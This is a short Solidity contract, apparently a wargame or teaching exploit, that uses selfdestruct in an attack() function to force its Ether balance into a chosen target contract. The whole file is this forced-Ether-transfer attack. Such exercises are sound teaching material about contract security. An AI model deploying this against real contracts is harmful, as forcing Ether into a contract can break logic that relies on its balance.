// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttackerFunded {
    address payable public target;
    
    constructor(address payable _target) payable {
        target = _target;
    }

    function attack() public payable {
        require(address(this).balance > 0, "Insufficient balance");
        selfdestruct(target);
    }
}